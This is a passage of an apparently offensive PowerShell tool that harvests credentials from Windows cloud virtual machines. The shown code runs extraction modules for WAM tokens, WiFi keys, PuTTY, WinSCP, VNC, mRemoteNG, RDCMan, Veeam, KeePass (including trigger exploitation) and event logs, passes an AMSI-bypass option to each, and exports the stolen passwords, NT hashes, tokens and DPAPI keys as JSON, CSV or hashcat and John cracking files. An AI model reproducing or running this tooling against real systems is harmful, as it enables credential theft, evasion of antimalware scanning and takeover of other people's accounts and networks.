                    Write-ColorOutput -Message "    [!] SCCM extraction failed: $($sccmResult.Error)" -Color "Red"
                }
            }
        }

        # WAM Token Broker Extraction
        if ($runWAM -and $target.OSType -eq "Windows") {
            $wamResult = Invoke-WAMExtraction -Target $target -PVKFile $PVKFile `
                -MasterKeyFile $MasterKeyFile -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $wamResult

            if ($wamResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "WAM" -Data $wamResult.Data
                if ($wamResult.Data.Tokens) { $stats.WAMTokens += $wamResult.Data.Tokens.Count }
            } else {
                $stats.Errors++
                if ($wamResult.Error) {
                    Write-ColorOutput -Message "    [!] WAM extraction failed: $($wamResult.Error)" -Color "Red"
                }
            }
        }

        # WiFi Extraction
        if ($runWiFi -and $target.OSType -eq "Windows") {
            $wifiResult = Invoke-WiFiExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $wifiResult
            if ($wifiResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "WIFI" -Data $wifiResult.Data
                if ($wifiResult.Data.Profiles) { $stats.WiFiProfiles += $wifiResult.Data.Profiles.Count }
            } else {
                $stats.Errors++
                if ($wifiResult.Error) { Write-ColorOutput -Message "    [!] WiFi extraction failed: $($wifiResult.Error)" -Color "Red" }
            }
        }

        # PuTTY Extraction
        if ($runPuTTY -and $target.OSType -eq "Windows") {
            $puttyResult = Invoke-PuTTYExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $puttyResult
            if ($puttyResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "PUTTY" -Data $puttyResult.Data
                if ($puttyResult.Data.Sessions) { $stats.PuTTYSessions += $puttyResult.Data.Sessions.Count }
            } else {
                $stats.Errors++
                if ($puttyResult.Error) { Write-ColorOutput -Message "    [!] PuTTY extraction failed: $($puttyResult.Error)" -Color "Red" }
            }
        }

        # Notepad Tab State Extraction
        if ($runNotepad -and $target.OSType -eq "Windows") {
            $notepadResult = Invoke-NotepadExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $notepadResult
            if ($notepadResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "NOTEPAD" -Data $notepadResult.Data
                if ($notepadResult.Data.Tabs) { $stats.NotepadTabs += $notepadResult.Data.Tabs.Count }
            } else {
                $stats.Errors++
                if ($notepadResult.Error) { Write-ColorOutput -Message "    [!] Notepad extraction failed: $($notepadResult.Error)" -Color "Red" }
            }
        }

        # Notepad++ Backup Extraction
        if ($runNotepadPP -and $target.OSType -eq "Windows") {
            $notepadppResult = Invoke-NotepadPPExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $notepadppResult
            if ($notepadppResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "NOTEPADPP" -Data $notepadppResult.Data
                if ($notepadppResult.Data.BackupFiles) { $stats.NotepadPPFiles += $notepadppResult.Data.BackupFiles.Count }
            } else {
                $stats.Errors++
                if ($notepadppResult.Error) { Write-ColorOutput -Message "    [!] Notepad++ extraction failed: $($notepadppResult.Error)" -Color "Red" }
            }
        }

        # KeePass Discovery
        if ($runKeePassDiscover -and $target.OSType -eq "Windows") {
            $keepassDiscoverResult = Invoke-KeePassDiscoverExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $keepassDiscoverResult
            if ($keepassDiscoverResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "KEEPASS_DISCOVER" -Data $keepassDiscoverResult.Data
                $kpCount = 0
                if ($keepassDiscoverResult.Data.ConfigFiles) { $kpCount += $keepassDiscoverResult.Data.ConfigFiles.Count }
                if ($keepassDiscoverResult.Data.DatabaseFiles) { $kpCount += $keepassDiscoverResult.Data.DatabaseFiles.Count }
                if ($keepassDiscoverResult.Data.Executables) { $kpCount += $keepassDiscoverResult.Data.Executables.Count }
                $stats.KeePassFindings += $kpCount
            } else {
                $stats.Errors++
                if ($keepassDiscoverResult.Error) { Write-ColorOutput -Message "    [!] KeePass discovery failed: $($keepassDiscoverResult.Error)" -Color "Red" }
            }
        }

        # KeePass Trigger Exploitation
        if ($runKeePassTrigger -and $target.OSType -eq "Windows") {
            $keepassTriggerResult = Invoke-KeePassTriggerExtraction -Target $target `
                -KeePassAction $KeePassAction -KeePassConfigPath $KeePassConfigPath `
                -KeePassExportPath $KeePassExportPath -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $keepassTriggerResult
            if ($keepassTriggerResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "KEEPASS_TRIGGER" -Data $keepassTriggerResult.Data
                if ($keepassTriggerResult.Data.Credentials) { $stats.KeePassCreds += $keepassTriggerResult.Data.Credentials.Count }
            } else {
                $stats.Errors++
                if ($keepassTriggerResult.Error) { Write-ColorOutput -Message "    [!] KeePass trigger failed: $($keepassTriggerResult.Error)" -Color "Red" }
            }
        }

        # RDCMan Extraction
        if ($runRDCMan -and $target.OSType -eq "Windows") {
            $rdcmanResult = Invoke-RDCManExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $rdcmanResult
            if ($rdcmanResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "RDCMAN" -Data $rdcmanResult.Data
                if ($rdcmanResult.Data.Connections) { $stats.RDCManConnections += $rdcmanResult.Data.Connections.Count }
            } else {
                $stats.Errors++
                if ($rdcmanResult.Error) { Write-ColorOutput -Message "    [!] RDCMan extraction failed: $($rdcmanResult.Error)" -Color "Red" }
            }
        }

        # Event Log Credential Extraction
        if ($runEventLogCreds -and $target.OSType -eq "Windows") {
            $evtResult = Invoke-EventLogCredsExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $evtResult
            if ($evtResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "EVENTLOG_CREDS" -Data $evtResult.Data
                if ($evtResult.Data.Credentials) { $stats.EventLogCreds += $evtResult.Data.Credentials.Count }
            } else {
                $stats.Errors++
                if ($evtResult.Error) { Write-ColorOutput -Message "    [!] EventLog creds extraction failed: $($evtResult.Error)" -Color "Red" }
            }
        }

        # WinSCP Extraction
        if ($runWinSCP -and $target.OSType -eq "Windows") {
            $winscpResult = Invoke-WinSCPExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $winscpResult
            if ($winscpResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "WINSCP" -Data $winscpResult.Data
                if ($winscpResult.Data.Sessions) { $stats.WinSCPSessions += $winscpResult.Data.Sessions.Count }
            } else {
                $stats.Errors++
                if ($winscpResult.Error) { Write-ColorOutput -Message "    [!] WinSCP extraction failed: $($winscpResult.Error)" -Color "Red" }
            }
        }

        # VNC Extraction
        if ($runVNC -and $target.OSType -eq "Windows") {
            $vncResult = Invoke-VNCExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $vncResult
            if ($vncResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "VNC" -Data $vncResult.Data
                if ($vncResult.Data.Passwords) { $stats.VNCPasswords += $vncResult.Data.Passwords.Count }
            } else {
                $stats.Errors++
                if ($vncResult.Error) { Write-ColorOutput -Message "    [!] VNC extraction failed: $($vncResult.Error)" -Color "Red" }
            }
        }

        # mRemoteNG Extraction
        if ($runMRemoteNG -and $target.OSType -eq "Windows") {
            $mremotengResult = Invoke-MRemoteNGExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $mremotengResult
            if ($mremotengResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "MREMOTENG" -Data $mremotengResult.Data
                if ($mremotengResult.Data.Connections) { $stats.MRemoteNGConnections += $mremotengResult.Data.Connections.Count }
            } else {
                $stats.Errors++
                if ($mremotengResult.Error) { Write-ColorOutput -Message "    [!] mRemoteNG extraction failed: $($mremotengResult.Error)" -Color "Red" }
            }
        }

        # Veeam Extraction
        if ($runVeeam -and $target.OSType -eq "Windows") {
            $veeamResult = Invoke-VeeamExtraction -Target $target -AmsiBypass $AmsiBypass -Timeout $Timeout
            $allResults += $veeamResult
            if ($veeamResult.Success) {
                Format-CredentialOutput -TargetName $target.Name -OSType $target.OSType -ExtractType "VEEAM" -Data $veeamResult.Data
                if ($veeamResult.Data.Credentials) { $stats.VeeamCreds += $veeamResult.Data.Credentials.Count }
            } else {
                $stats.Errors++
                if ($veeamResult.Error) { Write-ColorOutput -Message "    [!] Veeam extraction failed: $($veeamResult.Error)" -Color "Red" }
            }
        }

        Write-Host ""  # Spacing between targets
    }

    # Summary
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] EXTRACTION SUMMARY" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================" -Color "Cyan"
    $summaryParts = @("Targets: $($stats.Targets)")
    if ($stats.SAMHashes -gt 0 -or $runSAM) { $summaryParts += "SAM: $($stats.SAMHashes)" }
    if ($stats.Tokens -gt 0 -or $runTokens) { $summaryParts += "Tokens: $($stats.Tokens)" }
    if ($stats.DPAPISecrets -gt 0 -or $runDPAPI) { $summaryParts += "DPAPI: $($stats.DPAPISecrets)" }
    if ($stats.LSASecrets -gt 0 -or $runLSA) { $summaryParts += "LSA: $($stats.LSASecrets)" }
    if ($stats.NTDSHashes -gt 0 -or $runNTDS) { $summaryParts += "NTDS: $($stats.NTDSHashes)" }
    if ($stats.LSASSCreds -gt 0 -or $runLSASS) { $summaryParts += "LSASS: $($stats.LSASSCreds)" }
    if ($stats.BackupHashes -gt 0 -or $runBackup) { $summaryParts += "Backup: $($stats.BackupHashes)" }
    if ($stats.SCCMFindings -gt 0 -or $runSCCM) { $summaryParts += "SCCM: $($stats.SCCMFindings)" }
    if ($stats.WAMTokens -gt 0 -or $runWAM) { $summaryParts += "WAM: $($stats.WAMTokens)" }
    if ($stats.WiFiProfiles -gt 0 -or $runWiFi) { $summaryParts += "WiFi: $($stats.WiFiProfiles)" }
    if ($stats.PuTTYSessions -gt 0 -or $runPuTTY) { $summaryParts += "PuTTY: $($stats.PuTTYSessions)" }
    if ($stats.NotepadTabs -gt 0 -or $runNotepad) { $summaryParts += "Notepad: $($stats.NotepadTabs)" }
    if ($stats.NotepadPPFiles -gt 0 -or $runNotepadPP) { $summaryParts += "Notepad++: $($stats.NotepadPPFiles)" }
    if ($stats.KeePassFindings -gt 0 -or $runKeePassDiscover) { $summaryParts += "KeePass Discovery: $($stats.KeePassFindings)" }
    if ($stats.KeePassCreds -gt 0 -or $runKeePassTrigger) { $summaryParts += "KeePass Creds: $($stats.KeePassCreds)" }
    if ($stats.RDCManConnections -gt 0 -or $runRDCMan) { $summaryParts += "RDCMan: $($stats.RDCManConnections)" }
    if ($stats.EventLogCreds -gt 0 -or $runEventLogCreds) { $summaryParts += "EventLog: $($stats.EventLogCreds)" }
    if ($stats.WinSCPSessions -gt 0 -or $runWinSCP) { $summaryParts += "WinSCP: $($stats.WinSCPSessions)" }
    if ($stats.VNCPasswords -gt 0 -or $runVNC) { $summaryParts += "VNC: $($stats.VNCPasswords)" }
    if ($stats.MRemoteNGConnections -gt 0 -or $runMRemoteNG) { $summaryParts += "mRemoteNG: $($stats.MRemoteNGConnections)" }
    if ($stats.VeeamCreds -gt 0 -or $runVeeam) { $summaryParts += "Veeam: $($stats.VeeamCreds)" }
    $summaryParts += "Errors: $($stats.Errors)"
    Write-ColorOutput -Message "[*] $($summaryParts -join ' | ')" -Color "White"

    # Export results
    if ($ExportPath) {
        try {
            # Build export data
            $exportData = @()

            foreach ($result in $allResults) {
                $baseEntry = @{
                    Subscription = $result.Subscription
                    TargetName = $result.TargetName
                    ResourceGroup = $result.ResourceGroup
                    TargetType = $result.TargetType
                    OSType = $result.OSType
                    ExtractionType = $result.ExtractionType
                    Success = $result.Success
                    Error = $result.Error
                }

                switch ($result.ExtractionType) {
                    "SAM" {
                        if ($result.Data.Hashes) {
                            foreach ($hash in $result.Data.Hashes) {
                                $entry = $baseEntry.Clone()
                                $entry.Username = $hash.Username
                                $entry.RID = $hash.RID
                                $entry.LMHash = $hash.LMHash
                                $entry.NTHash = $hash.NTHash
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $entry = $baseEntry.Clone()
                            $entry.SAMPath = $result.Data.SAMPath
                            $entry.SYSTEMPath = $result.Data.SYSTEMPath
                            $entry.SECURITYPath = $result.Data.SECURITYPath
                            $exportData += [PSCustomObject]$entry
                        }
                    }
                    "TOKEN" {
                        if ($result.Data.Tokens) {
                            foreach ($token in $result.Data.Tokens) {
                                $entry = $baseEntry.Clone()
                                $entry.Resource = $token.Resource
                                $entry.AccessToken = $token.Token
                                $entry.ExpiresIn = $token.ExpiresIn
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $entry = $baseEntry.Clone()
                            $entry.HasManagedIdentity = $result.Data.HasManagedIdentity
                            $exportData += [PSCustomObject]$entry
                        }
                    }
                    "DPAPI" {
                        $entry = $baseEntry.Clone()
                        $entry.WiFiProfiles = ($result.Data.WiFiProfiles | ConvertTo-Json -Compress)
                        $entry.CredentialManager = ($result.Data.CredentialManager | ConvertTo-Json -Compress)
                        $entry.BrowserPaths = ($result.Data.BrowserPaths | ConvertTo-Json -Compress)
                        $exportData += [PSCustomObject]$entry
                    }
                    "LSA" {
                        $entry = $baseEntry.Clone()
                        $entry.Secrets = ($result.Data.Secrets | ConvertTo-Json -Compress)
                        $entry.CachedDomainCreds = ($result.Data.CachedDomainCreds | ConvertTo-Json -Compress)
                        $entry.MachineAccountHash = $result.Data.MachineAccountHash
                        $entry.DPAPIBackupKey = $result.Data.DPAPIBackupKey
                        $entry.SYSTEMPath = $result.Data.SYSTEMPath
                        $entry.SECURITYPath = $result.Data.SECURITYPath
                        $exportData += [PSCustomObject]$entry
                    }
                    "NTDS" {
                        if ($result.Data.Hashes -and $result.Data.Hashes.Count -gt 0) {
                            foreach ($hash in $result.Data.Hashes) {
                                $entry = $baseEntry.Clone()
                                $entry.Username = $hash.Username
                                $entry.RID = $hash.RID
                                $entry.LMHash = $hash.LMHash
                                $entry.NTHash = $hash.NTHash
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $entry = $baseEntry.Clone()
                            $entry.StagedFiles = ($result.Data.StagedFiles | ConvertTo-Json -Compress)
                            $entry.LocalPath = $result.Data.LocalPath
                            $exportData += [PSCustomObject]$entry
                        }
                    }
                    "LSASS" {
                        if ($result.Data.Credentials -and $result.Data.Credentials.Count -gt 0) {
                            foreach ($cred in $result.Data.Credentials) {
                                $entry = $baseEntry.Clone()
                                $entry.CredType = $cred.Type
                                $entry.Username = $cred.Username
                                $entry.Domain = $cred.Domain
                                $entry.NTHash = $cred.NTHash
                                $entry.Password = $cred.Password
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $entry = $baseEntry.Clone()
                            $entry.StagedDumpPath = $result.Data.StagedDumpPath
                            $entry.LocalDumpPath = $result.Data.LocalDumpPath
                            $entry.DumpSizeMB = $result.Data.DumpSizeMB
                            $exportData += [PSCustomObject]$entry
                        }
                    }
                    "BACKUP" {
                        $entry = $baseEntry.Clone()
                        $entry.HasBackupPrivilege = $result.Data.HasBackupPrivilege
                        $entry.IsDomainController = $result.Data.IsDomainController
                        if ($result.Data.Hashes -and $result.Data.Hashes.Count -gt 0) {
                            foreach ($hash in $result.Data.Hashes) {
                                $hashEntry = $entry.Clone()
                                $hashEntry.Username = $hash.Username
                                $hashEntry.RID = $hash.RID
                                $hashEntry.LMHash = $hash.LMHash
                                $hashEntry.NTHash = $hash.NTHash
                                $exportData += [PSCustomObject]$hashEntry
                            }
                        } else {
                            $entry.SAMPath = $result.Data.SAMPath
                            $entry.SYSTEMPath = $result.Data.SYSTEMPath
                            $entry.SECURITYPath = $result.Data.SECURITYPath
                            $exportData += [PSCustomObject]$entry
                        }
                    }
                    "SCCM" {
                        $entry = $baseEntry.Clone()
                        $entry.GPPPasswords = ($result.Data.GPPPasswords | ConvertTo-Json -Compress)
                        $entry.SCCMCacheFindings = ($result.Data.SCCMCacheFindings | ConvertTo-Json -Compress)
                        $entry.IntuneScripts = ($result.Data.IntuneScripts | ConvertTo-Json -Compress)
                        $entry.IISConfigs = ($result.Data.IISConfigs | ConvertTo-Json -Compress)
                        $entry.GraphAPIFindings = ($result.Data.GraphAPIFindings | ConvertTo-Json -Compress)
                        $exportData += [PSCustomObject]$entry
                    }
                    "WAM" {
                        if ($result.Data.Tokens -and $result.Data.Tokens.Count -gt 0) {
                            foreach ($token in $result.Data.Tokens) {
                                $entry = $baseEntry.Clone()
                                $entry.UPN = $token.UPN
                                $entry.Audience = $token.Audience
                                $entry.Scope = $token.Scope
                                $entry.Expiry = $token.Expiry
                                $entry.RawJWT = $token.RawJWT
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $entry = $baseEntry.Clone()
                            $entry.DPAPIMasterKeys = ($result.Data.DPAPIMasterKeys | ConvertTo-Json -Compress)
                            $exportData += [PSCustomObject]$entry
                        }
                    }
                    "WIFI" {
                        $entry = $baseEntry.Clone()
                        $entry.Profiles = ($result.Data.Profiles | ConvertTo-Json -Depth 5 -Compress)
                        $exportData += [PSCustomObject]$entry
                    }
                    "PUTTY" {
                        if ($result.Data.Sessions -and $result.Data.Sessions.Count -gt 0) {
                            foreach ($s in $result.Data.Sessions) {
                                $entry = $baseEntry.Clone()
                                $entry.User = $s.User
                                $entry.SessionName = $s.SessionName
                                $entry.HostName = $s.HostName
                                $entry.Port = $s.Port
                                $entry.UserName = $s.UserName
                                $entry.PublicKeyFile = $s.PublicKeyFile
                                $entry.ProxyUsername = $s.ProxyUsername
                                $entry.ProxyPassword = $s.ProxyPassword
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $exportData += [PSCustomObject]$baseEntry
                        }
                    }
                    "NOTEPAD" {
                        $entry = $baseEntry.Clone()
                        $entry.Tabs = ($result.Data.Tabs | ConvertTo-Json -Depth 5 -Compress)
                        $exportData += [PSCustomObject]$entry
                    }
                    "NOTEPADPP" {
                        $entry = $baseEntry.Clone()
                        $entry.BackupFiles = ($result.Data.BackupFiles | ConvertTo-Json -Depth 5 -Compress)
                        $entry.RecentFiles = ($result.Data.RecentFiles | ConvertTo-Json -Depth 5 -Compress)
                        $exportData += [PSCustomObject]$entry
                    }
                    "KEEPASS_DISCOVER" {
                        $entry = $baseEntry.Clone()
                        $entry.ConfigFiles = ($result.Data.ConfigFiles | ConvertTo-Json -Depth 5 -Compress)
                        $entry.Executables = ($result.Data.Executables | ConvertTo-Json -Depth 5 -Compress)
                        $entry.DatabaseFiles = ($result.Data.DatabaseFiles | ConvertTo-Json -Depth 5 -Compress)
                        $entry.RunningProcesses = ($result.Data.RunningProcesses | ConvertTo-Json -Depth 5 -Compress)
                        $exportData += [PSCustomObject]$entry
                    }
                    "KEEPASS_TRIGGER" {
                        if ($result.Data.Credentials -and $result.Data.Credentials.Count -gt 0) {
                            foreach ($cred in $result.Data.Credentials) {
                                $entry = $baseEntry.Clone()
                                $entry.Title = $cred.Title
                                $entry.Username = $cred.Username
                                $entry.Password = $cred.Password
                                $entry.URL = $cred.URL
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $entry = $baseEntry.Clone()
                            $entry.Action = $result.Data.Action
                            $entry.TriggerAdded = $result.Data.TriggerAdded
                            $entry.ExportFound = $result.Data.ExportFound
                            $entry.Cleaned = $result.Data.Cleaned
                            $exportData += [PSCustomObject]$entry
                        }
                    }
                    "RDCMAN" {
                        if ($result.Data.Connections -and $result.Data.Connections.Count -gt 0) {
                            foreach ($conn in $result.Data.Connections) {
                                $entry = $baseEntry.Clone()
                                $entry.User = $conn.User
                                $entry.ServerName = $conn.ServerName
                                $entry.Domain = $conn.Domain
                                $entry.Username = $conn.Username
                                $entry.EncryptedPassword = $conn.EncryptedPassword
                                $entry.RDGFilePath = $conn.RDGFilePath
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $exportData += [PSCustomObject]$baseEntry
                        }
                    }
                    "EVENTLOG_CREDS" {
                        if ($result.Data.Credentials -and $result.Data.Credentials.Count -gt 0) {
                            foreach ($cred in $result.Data.Credentials) {
                                $entry = $baseEntry.Clone()
                                $entry.Username = $cred.Username
                                $entry.Password = $cred.Password
                                $entry.CommandLine = $cred.CommandLine
                                $entry.EventId = $cred.EventId
                                $entry.TimeCreated = $cred.TimeCreated
                                $entry.Source = $cred.Source
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $exportData += [PSCustomObject]$baseEntry
                        }
                    }
                    "WINSCP" {
                        if ($result.Data.Sessions -and $result.Data.Sessions.Count -gt 0) {
                            foreach ($s in $result.Data.Sessions) {
                                $entry = $baseEntry.Clone()
                                $entry.User = $s.User
                                $entry.HostName = $s.HostName
                                $entry.Port = $s.Port
                                $entry.UserName = $s.UserName
                                $entry.Password = $s.Password
                                $entry.Protocol = $s.Protocol
                                $entry.MasterPasswordProtected = $s.MasterPasswordProtected
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $exportData += [PSCustomObject]$baseEntry
                        }
                    }
                    "VNC" {
                        if ($result.Data.Passwords -and $result.Data.Passwords.Count -gt 0) {
                            foreach ($pw in $result.Data.Passwords) {
                                $entry = $baseEntry.Clone()
                                $entry.Source = $pw.Source
                                $entry.Type = $pw.Type
                                $entry.DecryptedPassword = $pw.DecryptedPassword
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $exportData += [PSCustomObject]$baseEntry
                        }
                    }
                    "MREMOTENG" {
                        if ($result.Data.Connections -and $result.Data.Connections.Count -gt 0) {
                            foreach ($conn in $result.Data.Connections) {
                                $entry = $baseEntry.Clone()
                                $entry.User = $conn.User
                                $entry.ConfigPath = $conn.ConfigPath
                                $entry.Name = $conn.Name
                                $entry.Hostname = $conn.Hostname
                                $entry.Port = $conn.Port
                                $entry.Username = $conn.Username
                                $entry.Password = $conn.Password
                                $entry.Protocol = $conn.Protocol
                                $entry.Encrypted = $conn.Encrypted
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $exportData += [PSCustomObject]$baseEntry
                        }
                    }
                    "VEEAM" {
                        if ($result.Data.Credentials -and $result.Data.Credentials.Count -gt 0) {
                            foreach ($cred in $result.Data.Credentials) {
                                $entry = $baseEntry.Clone()
                                $entry.Username = $cred.Username
                                $entry.Password = $cred.Password
                                $entry.Description = $cred.Description
                                $exportData += [PSCustomObject]$entry
                            }
                        } else {
                            $entry = $baseEntry.Clone()
                            $entry.DatabaseConfig = ($result.Data.DatabaseConfig | ConvertTo-Json -Compress)
                            $exportData += [PSCustomObject]$entry
                        }
                    }
                }
            }

            # Determine export format
            if ($ExportPath -match "\.json$") {
                $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Encoding UTF8
            } elseif ($ExportPath -match "\.csv$") {
                $exportData | Export-Csv -Path $ExportPath -NoTypeInformation
            } elseif ($HashcatFormat) {
                # Hashcat format: username:hash
                $hashcatOutput = @()
                foreach ($r in $allResults | Where-Object { $_.ExtractionType -in @("SAM", "NTDS", "BACKUP") -and $_.Data.Hashes }) {
                    foreach ($hash in $r.Data.Hashes) {
                        $hashcatOutput += "$($hash.Username):$($hash.NTHash)"
                    }
                }
                $hashcatOutput | Out-File -FilePath $ExportPath -Encoding UTF8
            } elseif ($JohnFormat) {
                # John format: username:RID:LM:NT:::
                $johnOutput = @()
                foreach ($r in $allResults | Where-Object { $_.ExtractionType -in @("SAM", "NTDS", "BACKUP") -and $_.Data.Hashes }) {
                    foreach ($hash in $r.Data.Hashes) {
                        $johnOutput += "$($hash.Username):$($hash.RID):$($hash.LMHash):$($hash.NTHash):::"
                    }
                }
                $johnOutput | Out-File -FilePath $ExportPath -Encoding UTF8
            } else {
                # Default: JSON
                $exportData | ConvertTo-Json -Depth 10 | Out-File -FilePath $ExportPath -Encoding UTF8
            }

            Write-ColorOutput -Message "[+] Results exported to: $ExportPath" -Color "Green"

        } catch {
            Write-ColorOutput -Message "[!] Failed to export results: $($_.Exception.Message)" -Color "Red"
        }
    }

    return $allResults
}
